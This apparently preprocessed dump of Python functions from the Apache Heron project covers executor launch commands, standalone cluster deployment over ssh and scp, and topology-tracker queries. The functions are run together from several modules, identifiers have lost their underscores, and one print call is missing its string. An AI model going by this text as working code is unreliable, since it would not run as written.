'"' ) . replace ( '(61)' , '=' ) . replace ( '&equals;' , '=' ) ) if component jvm opts in json != "" : for ( k , v ) in json . loads ( component jvm opts in json ) . items ( ) : # In json, the component name and JVM options are still in base64 encoding self . component jvm opts [ base64 . b64decode ( k ) ] = base64 . b64decode ( v ) self . pkg type = parsed args . pkg type self . topology binary file = parsed args . topology binary file self . heron java home = parsed args . heron java home self . shell port = parsed args . shell port self . heron shell binary = parsed args . heron shell binary self . metrics manager port = parsed args . metrics manager port self . metricscache manager master port = parsed args . metricscache manager master port self . metricscache manager stats port = parsed args . metricscache manager stats port self . cluster = parsed args . cluster self . role = parsed args . role self . environment = parsed args . environment self . instance classpath = parsed args . instance classpath self . metrics sinks config file = parsed args . metrics sinks config file self . scheduler classpath = parsed args . scheduler classpath self . scheduler port = parsed args . scheduler port self . python instance binary = parsed args . python instance binary self . cpp instance binary = parsed args . cpp instance binary self . is stateful topology = ( parsed args . is stateful . lower ( ) == 'true' ) self . checkpoint manager classpath = parsed args . checkpoint manager classpath self . checkpoint manager port = parsed args . checkpoint manager port self . checkpoint manager ram = parsed args . checkpoint manager ram self . stateful config file = parsed args . stateful config file self . metricscache manager mode = parsed args . metricscache manager mode if parsed args . metricscache manager mode else "disabled" self . health manager mode = parsed args . health manager mode self . health manager classpath = '%s:%s' % ( self . scheduler classpath , parsed args . health manager classpath ) self . jvm remote debugger ports = parsed args . jvm remote debugger ports . split ( "," ) if parsed args . jvm remote debugger ports else None
def parse args ( args ) : Log . info ( "Input args: %r" % args ) parser = argparse . Argument Parser ( ) parser . add argument ( "--shard" , type = int , required = True ) parser . add argument ( "--topology-name" , required = True ) parser . add argument ( "--topology-id" , required = True ) parser . add argument ( "--topology-defn-file" , required = True ) parser . add argument ( "--state-manager-connection" , required = True ) parser . add argument ( "--state-manager-root" , required = True ) parser . add argument ( "--state-manager-config-file" , required = True ) parser . add argument ( "--tmaster-binary" , required = True ) parser . add argument ( "--stmgr-binary" , required = True ) parser . add argument ( "--metrics-manager-classpath" , required = True ) parser . add argument ( "--instance-jvm-opts" , required = True ) parser . add argument ( "--classpath" , required = True ) parser . add argument ( "--master-port" , required = True ) parser . add argument ( "--tmaster-controller-port" , required = True ) parser . add argument ( "--tmaster-stats-port" , required = True ) parser . add argument ( "--heron-internals-config-file" , required = True ) parser . add argument ( "--override-config-file" , required = True ) parser . add argument ( "--component-ram-map" , required = True ) parser . add argument ( "--component-jvm-opts" , required = True ) parser . add argument ( "--pkg-type" , required = True ) parser . add argument ( "--topology-binary-file" , required = True ) parser . add argument ( "--heron-java-home" , required = True ) parser . add argument ( "--shell-port" , required = True ) parser . add argument ( "--heron-shell-binary" , required = True ) parser . add argument ( "--metrics-manager-port" , required = True ) parser . add argument ( "--cluster" , required = True ) parser . add argument ( "--role" , required = True ) parser . add argument ( "--environment" , required = True ) parser . add argument ( "--instance-classpath" , required = True ) parser . add argument ( "--metrics-sinks-config-file" , required = True ) parser . add argument ( "--scheduler-classpath" , required = True ) parser . add argument ( "--scheduler-port" , required = True ) parser . add argument ( "--python-instance-binary" , required = True ) parser . add argument ( "--cpp-instance-binary" , required = True ) parser . add argument ( "--metricscache-manager-classpath" , required = True ) parser . add argument ( "--metricscache-manager-master-port" , required = True ) parser . add argument ( "--metricscache-manager-stats-port" , required = True ) parser . add argument ( "--metricscache-manager-mode" , required = False ) parser . add argument ( "--is-stateful" , required = True ) parser . add argument ( "--checkpoint-manager-classpath" , required = True ) parser . add argument ( "--checkpoint-manager-port" , required = True ) parser . add argument ( "--checkpoint-manager-ram" , type = long , required = True ) parser . add argument ( "--stateful-config-file" , required = True ) parser . add argument ( "--health-manager-mode" , required = True ) parser . add argument ( "--health-manager-classpath" , required = True ) parser . add argument ( "--jvm-remote-debugger-ports" , required = False , help = "ports to be used by a remote debugger for JVM instances" ) parsed args , unknown args = parser . parse known args ( args [ 1 : ] ) if unknown args : Log . error ( 'Unknown argument: %s' % unknown args [ 0 ] ) parser . print help ( ) sys . exit ( 1 ) return parsed args
def get metricsmgr cmd ( self , metrics Manager Id , sink config file , port ) : metricsmgr main class = 'org.apache.heron.metricsmgr.Metrics Manager' metricsmgr cmd = [ os . path . join ( self . heron java home , 'bin/java' ) , # We could not rely on the default -Xmx setting, which could be very big, # for instance, the default -Xmx in Twitter mesos machine is around 18GB '-Xmx1024M' , '-XX:+Print Command Line Flags' , '-verbosegc' , '-XX:+Print GC Details' , '-XX:+Print GC Time Stamps' , '-XX:+Print GC Date Stamps' , '-XX:+Print GC Cause' , '-XX:+Use GC Log File Rotation' , '-XX:Number Of GC Log Files=5' , '-XX:GC Log File Size=100M' , '-XX:+Print Promotion Failure' , '-XX:+Print Tenuring Distribution' , '-XX:+Print Heap At GC' , '-XX:+Heap Dump On Out Of Memory Error' , '-XX:+Use Conc Mark Sweep GC' , '-XX:+Print Command Line Flags' , '-Xloggc:log-files/gc.metricsmgr.log' , '-Djava.net.prefer I Pv4Stack=true' , '-cp' , self . metrics manager classpath , metricsmgr main class , '--id=' + metrics Manager Id , '--port=' + str ( port ) , '--topology=' + self . topology name , '--cluster=' + self . cluster , '--role=' + self . role , '--environment=' + self . environment , '--topology-id=' + self . topology id , '--system-config-file=' + self . heron internals config file , '--override-config-file=' + self . override config file , '--sink-config-file=' + sink config file ] return Command ( metricsmgr cmd , self . shell env )
def get metrics cache cmd ( self ) : metricscachemgr main class = 'org.apache.heron.metricscachemgr.Metrics Cache Manager' metricscachemgr cmd = [ os . path . join ( self . heron java home , 'bin/java' ) , # We could not rely on the default -Xmx setting, which could be very big, # for instance, the default -Xmx in Twitter mesos machine is around 18GB '-Xmx1024M' , '-XX:+Print Command Line Flags' , '-verbosegc' , '-XX:+Print GC Details' , '-XX:+Print GC Time Stamps' , '-XX:+Print GC Date Stamps' , '-XX:+Print GC Cause' , '-XX:+Use GC Log File Rotation' , '-XX:Number Of GC Log Files=5' , '-XX:GC Log File Size=100M' , '-XX:+Print Promotion Failure' , '-XX:+Print Tenuring Distribution' , '-XX:+Print Heap At GC' , '-XX:+Heap Dump On Out Of Memory Error' , '-XX:+Use Conc Mark Sweep GC' , '-XX:+Print Command Line Flags' , '-Xloggc:log-files/gc.metricscache.log' , '-Djava.net.prefer I Pv4Stack=true' , '-cp' , self . metricscache manager classpath , metricscachemgr main class , "--metricscache id" , 'metricscache-0' , "--master port" , self . metricscache manager master port , "--stats port" , self . metricscache manager stats port , "--topology name" , self . topology name , "--topology id" , self . topology id , "--system config file" , self . heron internals config file , "--override config file" , self . override config file , "--sink config file" , self . metrics sinks config file , "--cluster" , self . cluster , "--role" , self . role , "--environment" , self . environment ] return Command ( metricscachemgr cmd , self . shell env )
def get healthmgr cmd ( self ) : healthmgr main class = 'org.apache.heron.healthmgr.Health Manager' healthmgr cmd = [ os . path . join ( self . heron java home , 'bin/java' ) , # We could not rely on the default -Xmx setting, which could be very big, # for instance, the default -Xmx in Twitter mesos machine is around 18GB '-Xmx1024M' , '-XX:+Print Command Line Flags' , '-verbosegc' , '-XX:+Print GC Details' , '-XX:+Print GC Time Stamps' , '-XX:+Print GC Date Stamps' , '-XX:+Print GC Cause' , '-XX:+Use GC Log File Rotation' , '-XX:Number Of GC Log Files=5' , '-XX:GC Log File Size=100M' , '-XX:+Print Promotion Failure' , '-XX:+Print Tenuring Distribution' , '-XX:+Print Heap At GC' , '-XX:+Heap Dump On Out Of Memory Error' , '-XX:+Use Conc Mark Sweep GC' , '-XX:+Print Command Line Flags' , '-Xloggc:log-files/gc.healthmgr.log' , '-Djava.net.prefer I Pv4Stack=true' , '-cp' , self . health manager classpath , healthmgr main class , "--cluster" , self . cluster , "--role" , self . role , "--environment" , self . environment , "--topology name" , self . topology name , "--metricsmgr port" , self . metrics manager port ] return Command ( healthmgr cmd , self . shell env )
def get tmaster processes ( self ) : retval = { } tmaster cmd lst = [ self . tmaster binary , '--topology name=%s' % self . topology name , '--topology id=%s' % self . topology id , '--zkhostportlist=%s' % self . state manager connection , '--zkroot=%s' % self . state manager root , '--myhost=%s' % self . master host , '--master port=%s' % str ( self . master port ) , '--controller port=%s' % str ( self . tmaster controller port ) , '--stats port=%s' % str ( self . tmaster stats port ) , '--config file=%s' % self . heron internals config file , '--override config file=%s' % self . override config file , '--metrics sinks yaml=%s' % self . metrics sinks config file , '--metricsmgr port=%s' % str ( self . metrics manager port ) , '--ckptmgr port=%s' % str ( self . checkpoint manager port ) ] tmaster env = self . shell env . copy ( ) if self . shell env is not None else { } tmaster cmd = Command ( tmaster cmd lst , tmaster env ) if os . environ . get ( 'ENABLE HEAPCHECK' ) is not None : tmaster cmd . env . update ( { 'LD PRELOAD' : "/usr/lib/libtcmalloc.so" , 'HEAPCHECK' : "normal" } ) retval [ "heron-tmaster" ] = tmaster cmd if self . metricscache manager mode . lower ( ) != "disabled" : retval [ "heron-metricscache" ] = self . get metrics cache cmd ( ) if self . health manager mode . lower ( ) != "disabled" : retval [ "heron-healthmgr" ] = self . get healthmgr cmd ( ) retval [ self . metricsmgr ids [ 0 ] ] = self . get metricsmgr cmd ( self . metricsmgr ids [ 0 ] , self . metrics sinks config file , self . metrics manager port ) if self . is stateful topology : retval . update ( self . get ckptmgr process ( ) ) return retval
def get ckptmgr process ( self ) : ckptmgr main class = 'org.apache.heron.ckptmgr.Checkpoint Manager' ckptmgr ram mb = self . checkpoint manager ram / ( 1024 * 1024 ) ckptmgr cmd = [ os . path . join ( self . heron java home , "bin/java" ) , '-Xms%d M' % ckptmgr ram mb , '-Xmx%d M' % ckptmgr ram mb , '-XX:+Print Command Line Flags' , '-verbosegc' , '-XX:+Print GC Details' , '-XX:+Print GC Time Stamps' , '-XX:+Print GC Date Stamps' , '-XX:+Print GC Cause' , '-XX:+Use GC Log File Rotation' , '-XX:Number Of GC Log Files=5' , '-XX:GC Log File Size=100M' , '-XX:+Print Promotion Failure' , '-XX:+Print Tenuring Distribution' , '-XX:+Print Heap At GC' , '-XX:+Heap Dump On Out Of Memory Error' , '-XX:+Use Conc Mark Sweep GC' , '-XX:+Use Conc Mark Sweep GC' , '-Xloggc:log-files/gc.ckptmgr.log' , '-Djava.net.prefer I Pv4Stack=true' , '-cp' , self . checkpoint manager classpath , ckptmgr main class , '-t' + self . topology name , '-i' + self . topology id , '-c' + self . ckptmgr ids [ self . shard ] , '-p' + self . checkpoint manager port , '-f' + self . stateful config file , '-o' + self . override config file , '-g' + self . heron internals config file ] retval = { } retval [ self . ckptmgr ids [ self . shard ] ] = Command ( ckptmgr cmd , self . shell env ) return retval
def get heron support processes ( self ) : retval = { } retval [ self . heron shell ids [ self . shard ] ] = Command ( [ '%s' % self . heron shell binary , '--port=%s' % self . shell port , '--log file prefix=%s/heron-shell-%s.log' % ( self . log dir , self . shard ) , '--secret=%s' % self . topology id ] , self . shell env ) return retval
def wait process std out err ( self , name , process ) : proc . stream process stdout ( process , stdout log fn ( name ) ) process . wait ( )
def start processes ( self , commands ) : Log . info ( "Start processes" ) processes to monitor = { } # First start all the processes for ( name , command ) in commands . items ( ) : p = self . run process ( name , command ) processes to monitor [ p . pid ] = Process Info ( p , name , command ) # Log down the pid file log pid for process ( name , p . pid ) with self . process lock : self . processes to monitor . update ( processes to monitor )
def start state manager watches ( self ) : Log . info ( "Start state manager watches" ) statemgr config = State Mgr Config ( ) statemgr config . set state locations ( configloader . load state manager locations ( self . cluster , state manager config file = self . state manager config file , overrides = { "heron.statemgr.connection.string" : self . state manager connection } ) ) try : self . state managers = statemanagerfactory . get all state managers ( statemgr config ) for state manager in self . state managers : state manager . start ( ) except Exception as ex : Log . error ( "Found exception while initializing state managers: %s. Bailing out..." % ex ) traceback . print exc ( ) sys . exit ( 1 ) # pylint: disable=unused-argument def on packing plan watch ( state manager , new packing plan ) : Log . debug ( "State watch triggered for Packing Plan update on shard %s. Existing: %s, New: %s" % ( self . shard , str ( self . packing plan ) , str ( new packing plan ) ) ) if self . packing plan != new packing plan : Log . info ( "Packing Plan change detected on shard %s, relaunching effected processes." % self . shard ) self . update packing plan ( new packing plan ) Log . info ( "Updating executor processes" ) self . launch ( ) else : Log . info ( "State watch triggered for Packing Plan update but plan not changed so not relaunching." ) for state manager in self . state managers : # The callback function with the bound # state manager as first variable. on Packing Plan Watch = functools . partial ( on packing plan watch , state manager ) state manager . get packing plan ( self . topology name , on Packing Plan Watch ) Log . info ( "Registered state watch for packing plan changes with state manager %s." % str ( state manager ) )
def run ( self , name , config , builder ) : if not isinstance ( name , str ) : raise Runtime Error ( "Name has to be a string type" ) if not isinstance ( config , Config ) : raise Runtime Error ( "config has to be a Config type" ) if not isinstance ( builder , Builder ) : raise Runtime Error ( "builder has to be a Builder type" ) bldr = Topology Builder ( name = name ) builder . build ( bldr ) bldr . set config ( config . api config ) bldr . build and submit ( )
def modules to main ( mod List ) : if not mod List : return main = sys . modules [ ' main ' ] for modname in mod List : if isinstance ( modname , str ) : try : mod = import ( modname ) except Exception : sys . stderr . write ( 'warning: could not import %s\n.  ' 'Your function may unexpectedly error due to this import failing;' 'A version mismatch is likely.  Specific error was:\n' % modname ) print exec ( sys . stderr ) else : setattr ( main , mod . name , mod )
def load class ( cls , d ) : for k , v in d . items ( ) : if isinstance ( k , tuple ) : typ , k = k if typ == 'property' : v = property ( * v ) elif typ == 'staticmethod' : v = staticmethod ( v ) # pylint: disable=redefined-variable-type elif typ == 'classmethod' : v = classmethod ( v ) setattr ( cls , k , v ) return cls
def save module ( self , obj ) : self . modules . add ( obj ) self . save reduce ( subimport , ( obj . name , ) , obj = obj )
def tail ( filename , n ) : size = os . path . getsize ( filename ) with open ( filename , "rb" ) as f : fm = mmap . mmap ( f . fileno ( ) , 0 , mmap . MAP SHARED , mmap . PROT READ ) try : for i in xrange ( size - 1 , - 1 , - 1 ) : if fm [ i ] == '\n' : n -= 1 if n == - 1 : break return fm [ i + 1 if i else 0 : ] . splitlines ( ) finally : fm . close ( )
def get serializer ( context ) : cluster config = context . get cluster config ( ) serializer clsname = cluster config . get ( constants . TOPOLOGY SERIALIZER CLASSNAME , None ) if serializer clsname is None : return Python Serializer ( ) else : try : topo pex path = context . get topology pex path ( ) pex loader . load pex ( topo pex path ) serializer cls = pex loader . import and get class ( topo pex path , serializer clsname ) serializer = serializer cls ( ) return serializer except Exception as e : raise Runtime Error ( "Error with loading custom serializer class: %s, with error message: %s" % ( serializer clsname , str ( e ) ) )
def template slave hcl ( cl args , masters ) : slave config template = "%s/standalone/templates/slave.template.hcl" % cl args [ "config path" ] slave config actual = "%s/standalone/resources/slave.hcl" % cl args [ "config path" ] masters in quotes = [ '"%s"' % master for master in masters ] template file ( slave config template , slave config actual , { "<nomad masters:master port>" : ", " . join ( masters in quotes ) } )
def template scheduler yaml ( cl args , masters ) : single master = masters [ 0 ] scheduler config actual = "%s/standalone/scheduler.yaml" % cl args [ "config path" ] scheduler config template = "%s/standalone/templates/scheduler.template.yaml" % cl args [ "config path" ] template file ( scheduler config template , scheduler config actual , { "<scheduler uri>" : "http://%s:4646" % single master } )
def template uploader yaml ( cl args , masters ) : single master = masters [ 0 ] uploader config template = "%s/standalone/templates/uploader.template.yaml" % cl args [ "config path" ] uploader config actual = "%s/standalone/uploader.yaml" % cl args [ "config path" ] template file ( uploader config template , uploader config actual , { "<http uploader uri>" : "http://%s:9000/api/v1/file/upload" % single master } )
def template apiserver hcl ( cl args , masters , zookeepers ) : single master = masters [ 0 ] apiserver config template = "%s/standalone/templates/apiserver.template.hcl" % cl args [ "config path" ] apiserver config actual = "%s/standalone/resources/apiserver.hcl" % cl args [ "config path" ] replacements = { "<heron apiserver hostname>" : '"%s"' % get hostname ( single master , cl args ) , "<heron apiserver executable>" : '"%s/heron-apiserver"' % config . get heron bin dir ( ) if is self ( single master ) else '"%s/.heron/bin/heron-apiserver"' % get remote home ( single master , cl args ) , "<zookeeper host:zookeeper port>" : "," . join ( [ '%s' % zk if ":" in zk else '%s:2181' % zk for zk in zookeepers ] ) , "<scheduler uri>" : "http://%s:4646" % single master } template file ( apiserver config template , apiserver config actual , replacements )
def template statemgr yaml ( cl args , zookeepers ) : statemgr config file template = "%s/standalone/templates/statemgr.template.yaml" % cl args [ "config path" ] statemgr config file actual = "%s/standalone/statemgr.yaml" % cl args [ "config path" ] template file ( statemgr config file template , statemgr config file actual , { "<zookeeper host:zookeeper port>" : "," . join ( [ '"%s"' % zk if ":" in zk else '"%s:2181"' % zk for zk in zookeepers ] ) } )
def print cluster info ( cl args ) : parsed roles = read and parse roles ( cl args ) masters = list ( parsed roles [ Role . MASTERS ] ) slaves = list ( parsed roles [ Role . SLAVES ] ) zookeepers = list ( parsed roles [ Role . ZOOKEEPERS ] ) cluster = list ( parsed roles [ Role . CLUSTER ] ) # Ordered Dicts are used here so that the key order can be # specified directly info = Ordered Dict ( ) info [ 'num Nodes' ] = len ( cluster ) info [ 'nodes' ] = cluster roles = Ordered Dict ( ) roles [ 'masters' ] = masters roles [ 'slaves' ] = slaves roles [ 'zookeepers' ] = zookeepers urls = Ordered Dict ( ) urls [ 'service Url' ] = get service url ( cl args ) urls [ 'heron Ui' ] = get heron ui url ( cl args ) urls [ 'heron Tracker' ] = get heron tracker url ( cl args ) info [ 'roles' ] = roles info [ 'urls' ] = urls print json . dumps ( info , indent = 2 )
def add additional args ( parsers ) : for parser in parsers : cli args . add verbose ( parser ) cli args . add config ( parser ) parser . add argument ( '--heron-dir' , default = config . get heron dir ( ) , help = 'Path to Heron home directory' )
def start cluster ( cl args ) : roles = read and parse roles ( cl args ) masters = roles [ Role . MASTERS ] slaves = roles [ Role . SLAVES ] zookeepers = roles [ Role . ZOOKEEPERS ] Log . info ( "Roles:" ) Log . info ( " - Master Servers: %s" % list ( masters ) ) Log . info ( " - Slave Servers: %s" % list ( slaves ) ) Log . info ( " - Zookeeper Servers: %s" % list ( zookeepers ) ) if not masters : Log . error ( "No master servers specified!" ) sys . exit ( - 1 ) if not slaves : Log . error ( "No slave servers specified!" ) sys . exit ( - 1 ) if not zookeepers : Log . error ( "No zookeeper servers specified!" ) sys . exit ( - 1 ) # make sure configs are templated update config files ( cl args ) dist nodes = list ( masters . union ( slaves ) ) # if just local deployment if not ( len ( dist nodes ) == 1 and is self ( dist nodes [ 0 ] ) ) : distribute package ( roles , cl args ) start master nodes ( masters , cl args ) start slave nodes ( slaves , cl args ) start api server ( masters , cl args ) start heron tools ( masters , cl args ) Log . info ( "Heron standalone cluster complete!" )
def start heron tools ( masters , cl args ) : single master = list ( masters ) [ 0 ] wait for master to start ( single master ) cmd = "%s run %s >> /tmp/heron tools start.log 2>&1 &" % ( get nomad path ( cl args ) , get heron tools job file ( cl args ) ) Log . info ( "Starting Heron Tools on %s" % single master ) if not is self ( single master ) : cmd = ssh remote execute ( cmd , single master , cl args ) Log . debug ( cmd ) pid = subprocess . Popen ( cmd , shell = True , stdout = subprocess . PIPE , stderr = subprocess . PIPE ) return code = pid . wait ( ) output = pid . communicate ( ) Log . debug ( "return code: %s output: %s" % ( return code , output ) ) if return code != 0 : Log . error ( "Failed to start Heron Tools on %s with error:\n%s" % ( single master , output [ 1 ] ) ) sys . exit ( - 1 ) wait for job to start ( single master , "heron-tools" ) Log . info ( "Done starting Heron Tools" )
def distribute package ( roles , cl args ) : Log . info ( "Distributing heron package to nodes (this might take a while)..." ) masters = roles [ Role . MASTERS ] slaves = roles [ Role . SLAVES ] tar file = tempfile . Named Temporary File ( suffix = ".tmp" ) . name Log . debug ( "TAR file %s to %s" % ( cl args [ "heron dir" ] , tar file ) ) make tarfile ( tar file , cl args [ "heron dir" ] ) dist nodes = masters . union ( slaves ) scp package ( tar file , dist nodes , cl args )
def wait for master to start ( single master ) : i = 0 while True : try : r = requests . get ( "http://%s:4646/v1/status/leader" % single master ) if r . status code == 200 : break except : Log . debug ( sys . exc info ( ) [ 0 ] ) Log . info ( "Waiting for cluster to come up... %s" % i ) time . sleep ( 1 ) if i > 10 : Log . error ( "Failed to start Nomad Cluster!" ) sys . exit ( - 1 ) i = i + 1
def wait for job to start ( single master , job ) : i = 0 while True : try : r = requests . get ( "http://%s:4646/v1/job/%s" % ( single master , job ) ) if r . status code == 200 and r . json ( ) [ "Status" ] == "running" : break else : raise Runtime Error ( ) except : Log . debug ( sys . exc info ( ) [ 0 ] ) Log . info ( "Waiting for %s to come up... %s" % ( job , i ) ) time . sleep ( 1 ) if i > 20 : Log . error ( "Failed to start Nomad Cluster!" ) sys . exit ( - 1 ) i = i + 1
def scp package ( package file , destinations , cl args ) : pids = [ ] for dest in destinations : if is self ( dest ) : continue Log . info ( "Server: %s" % dest ) file path = "/tmp/heron.tar.gz" dest file path = "%s:%s" % ( dest , file path ) remote cmd = "rm -rf ~/.heron && mkdir ~/.heron " "&& tar -xzvf %s -C ~/.heron --strip-components 1" % ( file path ) cmd = '%s && %s' % ( scp cmd ( package file , dest file path , cl args ) , ssh remote execute ( remote cmd , dest , cl args ) ) Log . debug ( cmd ) pid = subprocess . Popen ( cmd , shell = True , stdout = subprocess . PIPE , stderr = subprocess . PIPE ) pids . append ( { "pid" : pid , "dest" : dest } ) errors = [ ] for entry in pids : pid = entry [ "pid" ] return code = pid . wait ( ) output = pid . communicate ( ) Log . debug ( "return code: %s output: %s" % ( return code , output ) ) if return code != 0 : errors . append ( "Failed to scp package to %s with error:\n%s" % ( entry [ "dest" ] , output [ 1 ] ) ) if errors : for error in errors : Log . error ( error ) sys . exit ( - 1 ) Log . info ( "Done distributing packages" )
def read and parse roles ( cl args ) : roles = dict ( ) with open ( get inventory file ( cl args ) , 'r' ) as stream : try : roles = yaml . load ( stream ) except yaml . YAML Error as exc : Log . error ( "Error parsing inventory file: %s" % exc ) sys . exit ( - 1 ) if Role . ZOOKEEPERS not in roles or not roles [ Role . ZOOKEEPERS ] : Log . error ( "Zookeeper servers node defined!" ) sys . exit ( - 1 ) if Role . CLUSTER not in roles or not roles [ Role . CLUSTER ] : Log . error ( "Heron cluster nodes defined!" ) sys . exit ( - 1 ) # Set roles roles [ Role . MASTERS ] = set ( [ roles [ Role . CLUSTER ] [ 0 ] ] ) roles [ Role . SLAVES ] = set ( roles [ Role . CLUSTER ] ) roles [ Role . ZOOKEEPERS ] = set ( roles [ Role . ZOOKEEPERS ] ) roles [ Role . CLUSTER ] = set ( roles [ Role . CLUSTER ] ) return roles
def get remote home ( host , cl args ) : cmd = "echo ~" if not is self ( host ) : cmd = ssh remote execute ( cmd , host , cl args ) pid = subprocess . Popen ( cmd , shell = True , stdout = subprocess . PIPE , stderr = subprocess . PIPE ) return code = pid . wait ( ) output = pid . communicate ( ) if return code != 0 : Log . error ( "Failed to get home path for remote host %s with output:\n%s" % ( host , output ) ) sys . exit ( - 1 ) return output [ 0 ] . strip ( "\n" )
def get hostname ( ip addr , cl args ) : if is self ( ip addr ) : return get self hostname ( ) cmd = "hostname" ssh cmd = ssh remote execute ( cmd , ip addr , cl args ) pid = subprocess . Popen ( ssh cmd , shell = True , stdout = subprocess . PIPE , stderr = subprocess . PIPE ) return code = pid . wait ( ) output = pid . communicate ( ) if return code != 0 : Log . error ( "Failed to get hostname for remote host %s with output:\n%s" % ( ip addr , output ) ) sys . exit ( - 1 ) return output [ 0 ] . strip ( "\n" )
def is self ( addr ) : ips = [ ] for i in netifaces . interfaces ( ) : entry = netifaces . ifaddresses ( i ) if netifaces . AF INET in entry : for ipv4 in entry [ netifaces . AF INET ] : if "addr" in ipv4 : ips . append ( ipv4 [ "addr" ] ) return addr in ips or addr == get self hostname ( )
def to table ( result ) : max count = 20 table , count = [ ] , 0 for role , envs topos in result . items ( ) : for env , topos in envs topos . items ( ) : for topo in topos : count += 1 if count > max count : continue else : table . append ( [ role , env , topo ] ) header = [ 'role' , 'env' , 'topology' ] rest count = 0 if count <= max count else count - max count return table , header , rest count
def show cluster ( cl args , cluster ) : try : result = tracker access . get cluster topologies ( cluster ) if not result : Log . error ( 'No topologies in cluster \'%s\'' % cluster ) return False result = result [ cluster ] except Exception : Log . error ( "Fail to connect to tracker: \'%s\'" , cl args [ "tracker url" ] ) return False table , header , rest count = to table ( result ) print ( 'Topologies running in cluster \'%s\'' % cluster ) if rest count : print ( '  with %d more...' % rest count ) print ( tabulate ( table , headers = header ) ) return True
def show cluster role ( cl args , cluster , role ) : try : result = tracker access . get cluster role topologies ( cluster , role ) if not result : Log . error ( 'Unknown cluster/role \'%s\'' % '/' . join ( [ cluster , role ] ) ) return False result = result [ cluster ] except Exception : Log . error ( "Fail to connect to tracker: \'%s\'" , cl args [ "tracker url" ] ) return False table , header , rest count = to table ( result ) print ( 'Topologies running in cluster \'%s\' submitted by \'%s\':' % ( cluster , role ) ) if rest count : print ( '  with %d more...' % rest count ) print ( tabulate ( table , headers = header ) ) return True
def show cluster role env ( cl args , cluster , role , env ) : try : result = tracker access . get cluster role env topologies ( cluster , role , env ) if not result : Log . error ( 'Unknown cluster/role/env \'%s\'' % '/' . join ( [ cluster , role , env ] ) ) return False result = result [ cluster ] except Exception : Log . error ( "Fail to connect to tracker: \'%s\'" , cl args [ "tracker url" ] ) return False table , header , rest count = to table ( result ) print ( % ( cluster , role , env ) ) if rest count : print ( '  with %d more...' % rest count ) print ( tabulate ( table , headers = header ) ) return True
def pick unused port ( self ) : s = socket . socket ( socket . AF INET , socket . SOCK STREAM ) s . bind ( ( '127.0.0.1' , 0 ) ) , port = s . getsockname ( ) s . close ( ) return port
def get pplan ( self , topology Name , callback = None ) : if callback : self . pplan watchers [ topology Name ] . append ( callback ) else : pplan path = self . get pplan path ( topology Name ) with open ( pplan path ) as f : data = f . read ( ) pplan = Physical Plan ( ) pplan . Parse From String ( data ) return pplan
def create socket options ( ) : sys config = system config . get sys config ( ) opt list = [ const . INSTANCE NETWORK WRITE BATCH SIZE BYTES , const . INSTANCE NETWORK WRITE BATCH TIME MS , const . INSTANCE NETWORK READ BATCH SIZE BYTES , const . INSTANCE NETWORK READ BATCH TIME MS , const . INSTANCE NETWORK OPTIONS SOCKET RECEIVED BUFFER SIZE BYTES , const . INSTANCE NETWORK OPTIONS SOCKET SEND BUFFER SIZE BYTES ] Log . debug ( "In create socket options()" ) try : value lst = [ int ( sys config [ opt ] ) for opt in opt list ] sock opt = Socket Options ( * value lst ) return sock opt except Value Error as e : # couldn't convert to int raise Value Error ( "Invalid value in sys config: %s" % str ( e ) ) except Key Error as e : # option key was not found raise Key Error ( "Incomplete sys config: %s" % str ( e ) )
def class dict to specs ( mcs , class dict ) : specs = { } for name , spec in class dict . items ( ) : if isinstance ( spec , Heron Component Spec ) : # Use the variable name as the specification name. if spec . name is None : spec . name = name if spec . name in specs : raise Value Error ( "Duplicate component name: %s" % spec . name ) else : specs [ spec . name ] = spec return specs
def init topology ( mcs , classname , class dict ) : if classname == 'Topology' : # Base class can't initialize protobuf return heron options = Topology Type . get heron options from env ( ) initial state = heron options . get ( "cmdline.topology.initial.state" , "RUNNING" ) tmp directory = heron options . get ( "cmdline.topologydefn.tmpdirectory" ) if tmp directory is None : raise Runtime Error ( "Topology definition temp directory not specified" ) topology name = heron options . get ( "cmdline.topology.name" , classname ) topology id = topology name + str ( uuid . uuid4 ( ) ) # create protobuf topology = topology pb2 . Topology ( ) topology . id = topology id topology . name = topology name topology . state = topology pb2 . Topology State . Value ( initial state ) topology . topology config . Copy From ( Topology Type . get topology config protobuf ( class dict ) ) Topology Type . add bolts and spouts ( topology , class dict ) class dict [ 'topology name' ] = topology name class dict [ 'topology id' ] = topology id class dict [ 'protobuf topology' ] = topology class dict [ 'topologydefn tmpdir' ] = tmp directory class dict [ 'heron runtime options' ] = heron options
def add spout ( self , name , spout cls , par , config = None , optional outputs = None ) : spout spec = spout cls . spec ( name = name , par = par , config = config , optional outputs = optional outputs ) self . add spec ( spout spec ) return spout spec
def add bolt ( self , name , bolt cls , par , inputs , config = None , optional outputs = None ) : bolt spec = bolt cls . spec ( name = name , par = par , inputs = inputs , config = config , optional outputs = optional outputs ) self . add spec ( bolt spec ) return bolt spec
def build and submit ( self ) : class dict = self . construct topo class dict ( ) topo cls = Topology Type ( self . topology name , ( Topology , ) , class dict ) topo cls . write ( )
def queries map ( ) : qs = all metric queries ( ) return dict ( zip ( qs [ 0 ] , qs [ 1 ] ) + zip ( qs [ 2 ] , qs [ 3 ] ) )
def get clusters ( ) : instance = tornado . ioloop . IO Loop . instance ( ) # pylint: disable=unnecessary-lambda try : return instance . run sync ( lambda : API . get clusters ( ) ) except Exception : Log . debug ( traceback . format exc ( ) ) raise
def get logical plan ( cluster , env , topology , role ) : instance = tornado . ioloop . IO Loop . instance ( ) try : return instance . run sync ( lambda : API . get logical plan ( cluster , env , topology , role ) ) except Exception : Log . debug ( traceback . format exc ( ) ) raise
def get topology info ( * args ) : instance = tornado . ioloop . IO Loop . instance ( ) try : return instance . run sync ( lambda : API . get topology info ( * args ) ) except Exception : Log . debug ( traceback . format exc ( ) ) raise
def get component metrics ( component , cluster , env , topology , role ) : all queries = metric queries ( ) try : result = get topology metrics ( cluster , env , topology , component , [ ] , all queries , [ 0 , - 1 ] , role ) return result [ "metrics" ] except Exception : Log . debug ( traceback . format exc ( ) ) raise
def get spout ( self ) : spout = topology pb2 . Spout ( ) spout . comp . Copy From ( self . get base component ( ) ) # Add output streams self . add out streams ( spout ) return spout
def get bolt ( self ) : bolt = topology pb2 . Bolt ( ) bolt . comp . Copy From ( self . get base component ( ) ) # Add streams self . add in streams ( bolt ) self . add out streams ( bolt ) return bolt
def get base component ( self ) : comp = topology pb2 . Component ( ) comp . name = self . name comp . spec = topology pb2 . Component Object Spec . Value ( "PYTHON CLASS NAME" ) comp . class name = self . python class path comp . config . Copy From ( self . get comp config ( ) ) return comp
